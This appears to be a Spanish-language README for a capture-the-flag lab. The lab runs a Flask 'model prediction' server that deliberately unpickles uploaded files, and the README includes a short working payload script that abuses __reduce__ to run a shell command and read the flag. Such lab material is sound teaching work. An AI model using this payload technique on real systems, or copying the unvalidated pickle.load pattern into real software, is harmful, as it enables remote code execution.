ia_pickle_1flag (Fase 1: RCE por deserialización insegura con Pickle)

Árbol de archivos
ia_pickle_1flag/
├── app.py              # Servidor Flask con endpoints vulnerables
├── requirements.txt    # Dependencias de Python
├── Dockerfile          # Imagen Docker para el servidor
├── docker-compose.yml  # Orquestador del contenedor
├── prepare.bash        # Genera la flag y prepara el entorno
├── start.bash          # Script para levantar el contenedor
├── stop.bash           # Script para detener el contenedor
├── _instance           # Nombre de la instancia generado automáticamente
├── .env                # Variables de entorno, incluyendo el puerto
├── _flag.txt           # Flag del reto (generada automáticamente)
├── models/             # Carpeta donde se guarda el modelo subido
├── templates/
│   └── form.html       # Formulario web para subir el modelo
└── crack/
    ├── crear_payload.py # Script que genera un payload malicioso
    ├── evil.pkl         # Ejemplo de pickle malicioso
    └── not_evil.pkl     # Ejemplo de pickle benigno

Escenario simulado
El reto reproduce un servidor de predicción que permite a los usuarios subir modelos en formato Pickle (.pkl) para hacer “predicciones”. Pickle permite serializar y deserializar objetos en Python. La vulnerabilidad surge porque se usa pickle.load() directamente sobre el archivo subido sin ninguna validación. Un atacante puede incluir código arbitrario en el pickle malicioso y lograr ejecución de comandos en el servidor (RCE).

Flujo de funcionamiento
- /upload (POST): permite al usuario subir un archivo .pkl, que se guarda como models/model.pkl
- /predict (GET): deserializa el archivo models/model.pkl usando pickle.load() y muestra el resultado como “predicción”
- No hay predicción real, simplemente se deserializa el objeto y se imprime
- En un sistema seguro se deberían usar librerías como joblib o sklearn y nunca pickle directamente

Descripción del reto
El objetivo de esta fase es demostrar la vulnerabilidad de deserialización insegura. El atacante debe crear un payload .pkl malicioso que, al ser cargado por pickle.load(), ejecute comandos en el servidor y permita acceder a la Flag1. La Flag1 está guardada en _flag.txt.

Explotación de la vulnerabilidad
Para generar un payload malicioso que lea la Flag1 se puede usar el script crack/crear_payload.py:

# crear_payload.py
import pickle
import subprocess

class Evil:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "_flag.txt"],))

with open("evil.pkl", "wb") as f:
    pickle.dump(Evil(), f)

print("evil.pkl creado.")

Generar el archivo malicioso:
python3 crack/crear_payload.py

Subir el archivo evil.pkl a través de la web en /upload y luego visitar /predict. La aplicación lo deserializa y ejecuta el comando embebido, mostrando el contenido de _flag.txt.

Workflow
1. Ejecutar bash prepare.bash para preparar el entorno y generar _flag.txt
2. Ejecutar bash start.bash para levantar el contenedor con Flask
3. Acceder a http://localhost:58080
4. Subir el archivo evil.pkl en /upload
5. Acceder a /predict para forzar la deserialización y obtener la Flag1
6. Ejecutar bash stop.bash para detener y limpiar el contenedor

Tecnologías utilizadas
- Docker y Docker Compose
- Python 3 con Flask
- pickle para serialización y deserialización
- Bash scripts para gestión de entorno

Objetivos de aprendizaje
- Comprender la vulnerabilidad de deserialización insegura en Python
- Observar cómo pickle.load() puede ejecutar código arbitrario al cargar un objeto manipulado
- Aprender a generar y usar un payload malicioso en formato pickle
- Extraer la Flag1 demostrando la explotación con RCE

